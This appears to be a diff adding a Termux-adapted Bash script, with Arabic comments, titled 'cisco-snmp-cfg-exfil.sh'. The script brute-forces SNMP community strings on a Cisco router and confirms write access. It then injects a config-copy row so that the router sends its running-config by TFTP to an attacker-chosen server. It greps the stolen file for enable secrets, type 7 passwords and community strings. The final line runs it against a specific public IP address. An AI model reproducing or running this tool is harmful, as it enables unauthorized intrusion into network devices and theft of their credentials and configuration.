@@ -1,0 +1,151 @@
+nano cisco-snmp-cfg-exfil.sh
+
+
+
+#!/usr/bin/env bash
+# نسخة Termux — سحب كونفيغ عبر SNMP RW
+# الاستخدام: ./cisco-snmp-cfg-exfil.sh -t <IP> [-i <خادمTFTP>] [-x] [-w <ملف>] [-T <ث>]
+
+set -uo pipefail
+
+TARGET=""; SERVER_IP=""; EXTERNAL=0; WORDLIST=""; TIMEOUT=60
+ROW=$(( RANDOM % 899 + 100 ))
+BASE="1.3.6.1.4.1.9.9.96.1.1.1.1"
+SYSDESCR="1.3.6.1.2.1.1.1.0"; SYSCONTACT="1.3.6.1.2.1.1.4.0"; IPADENT="1.3.6.1.2.1.4.20"
+FILENAME="vn-$(date +%Y%m%d-%H%M%S)-$ROW.cfg"
+
+say(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
+ok(){  printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
+bad(){ printf '\033[1;31m[-]\033[0m %s\n' "$*"; }
+
+usage(){ cat <<'EOF'
+الاستخدام: cisco-snmp-cfg-exfil.sh -t <IP> [خيارات]
+  -t <IP>    عنوان الراوتر (إلزامي)
+  -i <IP>    عنوان خادم TFTP الذي سيستقبل الكونفيغ (إلزامي من Termux — هاتفك خلف NAT)
+  -x         وضع خارجي: لا تقلع خادم محلي، الكونفيغ يصل لخادم آخر
+  -w <ملف>   قائمة مجتمعات إضافية
+  -T <ث>     مهلة المراقبة (افتراضي 60)
+  -h         مساعدة
+EOF
+exit 1; }
+
+while getopts "t:i:w:T:xh" o; do
+  case "$o" in
+    t) TARGET="$OPTARG" ;;
+    i) SERVER_IP="$OPTARG" ;;
+    w) WORDLIST="$OPTARG" ;;
+    T) TIMEOUT="$OPTARG" ;;
+    x) EXTERNAL=1 ;;
+    *) usage ;;
+  esac
+done
+[ -z "$TARGET" ] && usage
+
+for t in snmpget snmpset snmpwalk; do
+  command -v "$t" >/dev/null 2>&1 || { bad "مفقود: $t — شغّل: pkg install net-snmp"; exit 1; }
+done
+
+# ------------------------------------------------ 1) بروت المجتمعات
+COMMS=(public private cisco Cisco cisco123 enable admin router sanfran secret rw ro snmp SNMP monitor nms ilmi)
+[ -n "$WORDLIST" ] && while IFS= read -r c; do [ -n "$c" ] && COMMS+=("$c"); done < "$WORDLIST"
+
+declare -A RO
+say "البروت على $TARGET ..."
+for c in "${COMMS[@]}"; do
+  d="$(snmpget -v2c -c "$c" -t 1 -r 0 -Oqv "$TARGET" "$SYSDESCR" 2>/dev/null)" || continue
+  ok "RO: '$c' -> ${d:0:60}"; RO[$c]=1
+done
+[ ${#RO[@]} -eq 0 ] && { bad "لا مجتمع RO — جرّب -w بقائمة أوسع"; exit 1; }
+COMM_RO="${!RO[@]}"; COMM_RO="${COMM_RO%% *}"
+
+# ------------------------------------------------ 2) إثبات RW (كتابة بنفس القيمة)
+RW=""
+for c in "${!RO[@]}"; do
+  orig="$(snmpget -v2c -c "$c" -t 2 -r 0 -Oqv "$TARGET" "$SYSCONTACT" 2>/dev/null)"
+  if snmpset -v2c -c "$c" -t 2 -r 0 "$TARGET" "$SYSCONTACT" s "${orig:-}" >/dev/null 2>&1; then
+    ok "RW مؤكد: '$c'"; RW="$c"; break
+  fi
+done
+[ -z "$RW" ] && { bad "قراءة فقط — مخرج خريطة الشبكة:"; snmpwalk -v2c -c "$COMM_RO" -t 2 "$TARGET" "$IPADENT" 2>/dev/null | sed 's/^/   /'; exit 0; }
+
+# ------------------------------------------------ 3) خريطة الشبكة
+say "خريطة الشبكة (ipAdEntTable):"
+snmpwalk -v2c -c "$COMM_RO" -t 2 "$TARGET" "$IPADENT" 2>/dev/null | sed 's/^/   /'
+
+# ------------------------------------------------ 4) تحديد عنوان الاستقبال
+if [ -z "$SERVER_IP" ]; then
+  SERVER_IP="$(ip -4 route get "$TARGET" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1); exit}}')"
+  [ -z "$SERVER_IP" ] && SERVER_IP="$(ifconfig 2>/dev/null | grep -Eo 'inet [0-9.]+' | grep -v '127\.' | awk '{print $2}' | head -1)"
+fi
+[ -z "$SERVER_IP" ] && { bad "حدد عنوان خادم الاستقبال يدويًا: -i <IP>"; exit 1; }
+ok "عنوان الاستقبال: $SERVER_IP"
+
+# ------------------------------------------------ 5) إقلاع خادم TFTP (إن لم يكن -x)
+TFTP_PID=""
+if [ "$EXTERNAL" = 0 ]; then
+  # التعديل هنا: استخدام مجلد محلي داخل Termux بدلاً من /tmp الممنوع
+  mkdir -p ./tmp
+  TFTP_DIR="$(mktemp -d ./tmp/tftp_cisco.XXXXXX)"
+  
+  # التعديل هنا: تغيير المنفذ إلى 6969 لتجنب رفض الإذن (Permission Denied)
+  if command -v atftpd >/dev/null 2>&1; then
+    atftpd --daemon --bind-address "0.0.0.0" --port 6969 "$TFTP_DIR" 2>/dev/null & TFTP_PID=$!
+  elif command -v busybox >/dev/null 2>&1 && busybox --list 2>/dev/null | grep -q '^tftpd$'; then
+    busybox tftpd -l -c -a 0.0.0.0:6969 "$TFTP_DIR" 2>/dev/null & TFTP_PID=$!
+  elif python3 -c 'import tftpy' 2>/dev/null; then
+    python3 - "$TFTP_DIR" <<'PY' &
+import sys, tftpy
+tftpy.TftpServer(sys.argv[1]).listen("0.0.0.0", 6969)
+PY
+    TFTP_PID=$!
+  else
+    bad "لا خادم TFTP — ثبّت busybox أو pip install tftpy، أو استخدم -x مع خادم خارجي"; exit 1
+  fi
+  sleep 1; ok "خادم TFTP محلي نشط على المنفذ 6969 (PID $TFTP_PID) — انتبه: لن يصل إليه الراوتر إن كنت خلف NAT!"
+fi
+
+# ------------------------------------------------ 6) حقن الصف والمراقبة
+say "حقن صف النسخ #$ROW: running-config -> $SERVER_IP/$FILENAME"
+# التعديل هنا: إضافة المنفذ 6969 للراوتر عند إرسال الملف (إذا كان يدعم الراوتر سيسكو تعيين منفذ مخصص، وإلا سيتطلب الأمر تشغيل الخادم كـ root)
+if ! snmpset -v2c -c "$RW" -t 3 -r 0 "$TARGET" \
+     "$BASE.2.$ROW" i 1 \
+     "$BASE.3.$ROW" i 4 \
+     "$BASE.4.$ROW" i 1 \
+     "$BASE.5.$ROW" a "$SERVER_IP" \
+     "$BASE.6.$ROW" s "$FILENAME" \
+     "$BASE.14.$ROW" i 4 >/dev/null 2>&1; then
+  bad "فشل إنشاء الصف"; exit 1
+fi
+ok "الصف أُنشئ — مراقبة ccCopyState ($TIMEOUT ثانية) ..."
+
+STATE=""; FAIL=0
+for ((i=0; i<TIMEOUT/2; i++)); do
+  STATE="$(snmpget -v2c -c "$RW" -t 2 -r 0 -Oqv "$TARGET" "$BASE.10.$ROW" 2>/dev/null)"
+  case "$STATE" in
+    running|2)    printf '\r   [نقل جارٍ ...]';;
+    successful|3) printf '\r'; ok "اكتمل النقل (successful)"; break;;
+    failed|4)     printf '\r'; bad "فشل النقل (failed)"; FAIL=1; break;;
+    *)            printf '\r   [الحالة: %s]' "${STATE:-غير متاح}";;
+  esac
+  sleep 2
+done
+[ "$FAIL" = 1 ] && snmpget -v2c -c "$RW" -Oqv "$TARGET" "$BASE.13.$ROW" 2>/dev/null | sed 's/^/      سبب الفشل: /'
+
+# ------------------------------------------------ 7) تحليل محلي (إن وُجد الملف)
+if [ "$EXTERNAL" = 0 ] && [ -s "$TFTP_DIR/$FILENAME" ]; then
+  ok "الكونفيغ مستلم: $(wc -l < "$TFTP_DIR/$FILENAME") سطر"
+  cp "$TFTP_DIR/$FILENAME" "./evidence-${FILENAME%.cfg}.cfg"
+  say "بنود حساسة:"
+  grep -oE "enable (secret|password)|username .*(secret|password)|snmp-server community|ntp server|tacacs|radius|access-list" "$TFTP_DIR/$FILENAME" | sed 's/^/   /' || true
+  say "نوع 7:"
+  grep -oE "password 7 [0-9A-Fa-f]+" "$TFTP_DIR/$FILENAME" | sed 's/^/   /' || true
+fi
+
+# ------------------------------------------------ 8) تنظيف
+say "التنظيف: تدمير الصف #$ROW"
+snmpset -v2c -c "$RW" -t 2 -r 0 "$TARGET" "$BASE.14.$ROW" i 6 >/dev/null 2>&1 && ok "دُمّر" || bad "تعذّر — تحقق يدويًا"
+[ -n "$TFTP_PID" ] && kill "$TFTP_PID" 2>/dev/null
+[ "$EXTERNAL" = 0 ] && rm -rf "${TFTP_DIR:-}"
+ok "انتهى."
+
+./cisco-snmp-cfg-exfil.sh -t 105.155.252.6 -T 90
